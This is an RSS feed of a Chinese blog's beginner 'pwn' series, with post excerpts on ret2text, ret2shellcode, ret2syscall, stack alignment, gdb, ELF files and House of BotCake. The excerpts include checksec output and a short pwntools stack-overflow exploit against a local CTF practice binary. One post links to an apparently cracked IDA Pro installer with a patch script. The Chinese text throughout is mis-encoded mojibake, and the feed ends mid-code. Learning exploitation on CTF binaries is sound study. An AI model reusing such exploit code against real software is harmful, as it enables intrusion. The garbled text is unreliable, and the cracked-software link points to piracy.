<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lhon901's blog</title><link>/posts/</link><description>Recent content in Posts on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Sat, 28 Jun 2025 17:22:01 +0800</lastBuildDate><atom:link href="/posts/rss.xml" rel="self" type="application/rss+xml"/><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2syscall</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</link><pubDate>Sat, 28 Jun 2025 17:22:01 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ret2syscall æ˜¯ Pwn è¿›é˜¶ä¸­çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼Œå®ƒå…è®¸æˆ‘ä»¬é€šè¿‡ä¿®æ”¹è¿”å›åœ°å€æ¥ç›´æ¥è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå®ç°æ›´å¤æ‚çš„æ”»å‡»ã€‚æœ¬æ–‡å°†ä»‹ç» ret2syscall çš„åŸºæœ¬åŸç†å’Œåº”ç”¨ã€‚&lt;/p>
&lt;p>C è¯­è¨€ä¸­çš„ &lt;code>puts&lt;/code> &lt;code>read&lt;/code> &lt;code>write&lt;/code> ç­‰å‡½æ•°å®é™…ä¸Šæ˜¯å¯¹ç³»ç»Ÿè°ƒç”¨çš„å°è£…ã€‚é€šè¿‡ ret2syscallï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨è¿™äº›ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œä¸éœ€è¦ä¾èµ– libc å‡½æ•°ã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2shellcode</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</link><pubDate>Fri, 27 Jun 2025 22:49:50 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ret2shellcode å³æ˜¯å°†ç¨‹åºçš„æ§åˆ¶æµåŠ«æŒåˆ°æˆ‘ä»¬æ„é€ çš„ shellcode ä¸Šã€‚shellcode æ˜¯ä¸€æ®µå¯ä»¥è¢«æ‰§è¡Œçš„ä»£ç ï¼Œé€šå¸¸ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–æ‰“å¼€ä¸€ä¸ª shellã€‚&lt;/p>
&lt;p>æƒ³è¦æ‰§è¡Œ sehllcode, shellcode æ‰€åœ¨çš„å†…å­˜åŒºåŸŸå¿…é¡»æ˜¯å¯æ‰§è¡Œçš„ã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2text</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</link><pubDate>Wed, 25 Jun 2025 14:32:23 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ä¹‹å‰æˆ‘ä»¬å·²ç»åˆæ­¥ä»‹ç»äº†æ ˆæº¢å‡ºå’Œæ ˆå¯¹é½ï¼Œè¿™ä¸€èŠ‚æˆ‘ä»¬å°†åšä¸€ä¸ªå·©å›ºç»ƒä¹ &lt;/p>
&lt;h2 id="ret2text">ret2text
&lt;a class="header-anchor" href="#ret2text">&lt;/a>
&lt;/h2>&lt;p>
&lt;a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text" title="ret2text" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 ret2text
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>&lt;/p>
&lt;p>å…ˆè¿›è¡Œå®‰å…¨é˜²æŠ¤æ£€æµ‹&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~/P/c/p/l/u/s/r/bamboofox-ret2text â¯â¯â¯ chmod +x ./ret2text &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span> master
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;./ret2text&amp;#39;&lt;/span> çš„æ¨¡å¼å·²ç”± &lt;span class="m">0644&lt;/span> &lt;span class="o">(&lt;/span>rw-r--r--&lt;span class="o">)&lt;/span> æ›´æ”¹ä¸º &lt;span class="m">0755&lt;/span> &lt;span class="o">(&lt;/span>rwxr-xr-x&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">~/P/c/p/l/u/s/r/bamboofox-ret2text â¯â¯â¯ pwn checksec ./ret2text &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span> master âœ±
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="s1">&amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Arch: i386-32-little
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stack: No canary found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NX: NX enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PIE: No PIE &lt;span class="o">(&lt;/span>0x8048000&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stripped: No
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Debuginfo: Yes&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>ida pro é€†å‘&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - æ ˆå¯¹é½</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</link><pubDate>Tue, 24 Jun 2025 12:37:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>åœ¨ä¸Šä¸€èŠ‚ä¸­ä¸ºäº†æˆåŠŸæ‰§è¡Œ payloadï¼Œæˆ‘ä»¬åœ¨ exp.py ä¸­åŠ å…¥äº† &lt;code>ret&lt;/code> æŒ‡ä»¤ï¼Œä»Šå¤©æˆ‘ä»¬å°†ç»§ç»­æ·±å…¥äº†è§£æ ˆå¯¹é½çš„é—®é¢˜ã€‚&lt;/p>
&lt;h2 id="æ ˆå¯¹é½">æ ˆå¯¹é½
&lt;a class="header-anchor" href="#%e6%a0%88%e5%af%b9%e9%bd%90">&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-12">&lt;a class="lnlinks" href="#hl-0-12">12&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./main&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># å¯åŠ¨ç¨‹åº&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">backdoor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x401170&lt;/span> &lt;span class="c1"># backdoor å‡½æ•°çš„åœ°å€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 0x000000000040101a : ret&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x40101a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">backdoor&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># å¡«å……åˆ° 0x10 å­—èŠ‚ + 8 å­—èŠ‚çš„è¿”å›åœ°å€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># å‘é€ payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>å¼€å§‹è°ƒè¯•åä¸€ç›´è·Ÿè¸ªåˆ°å‘ç°å¡ä½æ— æ³•è°ƒè¯•äº†&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - æ ˆæº¢å‡ºåˆè¯†</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</link><pubDate>Mon, 23 Jun 2025 18:30:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ä¸ºä»€ä¹ˆè¾“å…¥ä¸€ä¸²æ‚ä¹±çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½è®©ç¨‹åºå´©æºƒï¼Ÿä¸ºä»€ä¹ˆè¾“å…¥ä¸€ä¸²ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½è®©ç¨‹åºæ‰§è¡Œä»»æ„ä»£ç ï¼Ÿä¸‹é¢çš„å†…å®¹å°†å¸¦ä½ èµ°è¿› Pwn çš„ä¸–ç•Œï¼Œäº†è§£æ ˆæº¢å‡ºæ˜¯å¦‚ä½•å‘ç”Ÿçš„ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Pwn ç¯å¢ƒçš„æ­å»º</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 23 Jun 2025 18:15:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</guid><description>&lt;h2 id="é™æ€ä»£ç åˆ†æ">é™æ€ä»£ç åˆ†æ
&lt;a class="header-anchor" href="#%e9%9d%99%e6%80%81%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90">&lt;/a>
&lt;/h2>&lt;h3 id="ida-pro">ida pro
&lt;a class="header-anchor" href="#ida-pro">&lt;/a>
&lt;/h3>&lt;p>
&lt;a href="https://www.52pojie.cn/thread-1970020-1-1.html" title="[Disassemblers] IDA Pro 9.0 RC1 å…¨å¹³å°å®‰è£…åŒ… åŠ patchè„šæœ¬" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 [Disassemblers] IDA Pro 9.0 RC1 å…¨å¹³å°å®‰è£…åŒ… åŠ patchè„šæœ¬
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>&lt;/p>
&lt;p>å®‰è£…è¿‡ç¨‹ä¸å†èµ˜è¿°&lt;/p>
&lt;p>å°†è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‹–å…¥ IDA Pro ä¸­ï¼Œç­‰å¾…åˆ†æå®Œæˆã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - æŒæ¡è°ƒè¯•å™¨ gdb çš„åŸºæœ¬ä½¿ç”¨</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Sun, 22 Jun 2025 16:32:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>&lt;h2 id="gdb">GDB
&lt;a class="header-anchor" href="#gdb">&lt;/a>
&lt;/h2>&lt;h3 id="ä»‹ç»">ä»‹ç»
&lt;a class="header-anchor" href="#%e4%bb%8b%e7%bb%8d">&lt;/a>
&lt;/h3>&lt;p>gdb æ˜¯ GNU Debugger çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„è°ƒè¯•å·¥å…·ï¼Œå¹¿æ³›ç”¨äºè°ƒè¯• C/C++ ç¨‹åºã€‚å®ƒå…è®¸å¼€å‘è€…åœ¨ç¨‹åºè¿è¡Œæ—¶æ£€æŸ¥å˜é‡ã€è®¾ç½®æ–­ç‚¹ã€å•æ­¥æ‰§è¡Œä»£ç ç­‰æ“ä½œã€‚æŒæ¡ gdb æ˜¯è¿›è¡Œ Pwn æŒ‘æˆ˜çš„åŸºç¡€æŠ€èƒ½ä¹‹ä¸€ã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - x86 æ±‡ç¼–åŸºç¡€</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</link><pubDate>Sun, 22 Jun 2025 14:00:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</guid><description>&lt;h2 id="æ±‡ç¼–è¯­è¨€é£æ ¼">æ±‡ç¼–è¯­è¨€é£æ ¼
&lt;a class="header-anchor" href="#%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e9%a3%8e%e6%a0%bc">&lt;/a>
&lt;/h2>&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>AT&amp;amp;T&lt;/th>
 &lt;th>Intel&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>å¯„å­˜å™¨å‰ç¼€ &lt;code>%&lt;/code>&lt;/td>
 &lt;td>å¯„å­˜å™¨æ— å‰ç¼€&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>ç«‹å³æ•°å‰ç¼€ &lt;code>$&lt;/code>&lt;/td>
 &lt;td>ç«‹å³æ•°æ— å‰ç¼€&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>16 è¿›åˆ¶æ•°å‰ç¼€ &lt;code>0x&lt;/code>&lt;/td>
 &lt;td>16 è¿›åˆ¶æ•°åç¼€ &lt;code>h&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>æºæ“ä½œæ•°åœ¨å‰ï¼Œç›®æ ‡æ“ä½œæ•°åœ¨å&lt;/td>
 &lt;td>æºæ“ä½œæ•°åœ¨åï¼Œç›®æ ‡æ“ä½œæ•°åœ¨å‰&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>é—´æ¥å¯»å€ä½¿ç”¨ &lt;code>(%reg)&lt;/code>&lt;/td>
 &lt;td>é—´æ¥å¯»å€ä½¿ç”¨ &lt;code>[reg]&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>é—´æ¥å¯»å€æ ¼å¼ä¸º &lt;code>(%reg, %reg, scale)&lt;/code>&lt;/td>
 &lt;td>é—´æ¥å¯»å€æ ¼å¼ä¸º &lt;code>[reg + reg * scale]&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>æ“ä½œæ•°å¤§å°åç¼€ &lt;code>b&lt;/code>ã€&lt;code>w&lt;/code>ã€&lt;code>l&lt;/code>&lt;/td>
 &lt;td>æ“ä½œæ•°å¤§å°åç¼€ &lt;code>byte ptr&lt;/code>ã€&lt;code>word ptr&lt;/code>ã€&lt;code>dword ptr&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="å¯„å­˜å™¨">å¯„å­˜å™¨
&lt;a class="header-anchor" href="#%e5%af%84%e5%ad%98%e5%99%a8">&lt;/a>
&lt;/h2>
 &lt;blockquote>
 &lt;p>å¯„å­˜å™¨æ˜¯ CPU å†…éƒ¨çš„é«˜é€Ÿå­˜å‚¨å™¨ï¼Œç”¨äºå­˜å‚¨ä¸´æ—¶æ•°æ®å’ŒæŒ‡ä»¤æ‰§è¡ŒçŠ¶æ€ã€‚&lt;/p></description></item><item><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - æ·±å…¥äº†è§£ elf æ–‡ä»¶</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</link><pubDate>Fri, 20 Jun 2025 22:00:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</guid><description>&lt;h2 id="elf-æ–‡ä»¶åˆè¯†">ELF æ–‡ä»¶åˆè¯†
&lt;a class="header-anchor" href="#elf-%e6%96%87%e4%bb%b6%e5%88%9d%e8%af%86">&lt;/a>
&lt;/h2>&lt;p>ELF æ–‡ä»¶å³ Linux ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒELF æ˜¯ Executable and Linkable Format çš„ç¼©å†™ã€‚å®ƒæ˜¯ä¸€ä¸ªæ ‡å‡†çš„äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå­˜å‚¨å¯æ‰§è¡Œæ–‡ä»¶ã€ç›®æ ‡ä»£ç ã€å…±äº«åº“å’Œæ ¸å¿ƒè½¬å‚¨ç­‰ã€‚&lt;/p>
&lt;p>ä½¿ç”¨ Linux å†…ç½®å‘½ä»¤ file å¯ä»¥è½»æ¾æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼š&lt;/p></description></item><item><title>House_of_BotCake</title><link>/posts/house_of_botcake/</link><pubDate>Thu, 17 Apr 2025 22:03:37 +0800</pubDate><guid>/posts/house_of_botcake/</guid><description>&lt;h2 id="åˆ©ç”¨èƒŒæ™¯">åˆ©ç”¨èƒŒæ™¯
&lt;a class="header-anchor" href="#%e5%88%a9%e7%94%a8%e8%83%8c%e6%99%af">&lt;/a>
&lt;/h2>&lt;p>è‡ª glibc 2.29 å¼€å§‹åŠ å…¥äº†å¯¹ tcache çš„ double free æ£€æŸ¥, ä½¿å¾—ä¹‹å‰çš„ tcache double free å¤±æ•ˆ&lt;/p>
&lt;h3 id="æºç è§£è¯»">æºç è§£è¯»
&lt;a class="header-anchor" href="#%e6%ba%90%e7%a0%81%e8%a7%a3%e8%af%bb">&lt;/a>
&lt;/h3>&lt;p>tcache ç»“æ„ä½“&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4">4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5">5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6">6&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_entry&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//é“¾è¡¨æŒ‡é’ˆï¼Œå¯¹åº”chunkä¸­çš„fdå­—æ®µ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="cm">/* This field exists to detect double frees. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_perthread_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//æŒ‡å‘æ‰€å±çš„tcacheç»“æ„ä½“ï¼Œå¯¹åº”chunkä¸­çš„bkå­—æ®µ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">tcache_entry&lt;/span>&lt;span class="p">;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>tcache è¢«ç½®å…¥é“¾è¡¨&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-1-1">&lt;a class="lnlinks" href="#hl-1-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-2">&lt;a class="lnlinks" href="#hl-1-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-3">&lt;a class="lnlinks" href="#hl-1-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-4">&lt;a class="lnlinks" href="#hl-1-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-5">&lt;a class="lnlinks" href="#hl-1-5"> 5&lt;/a>
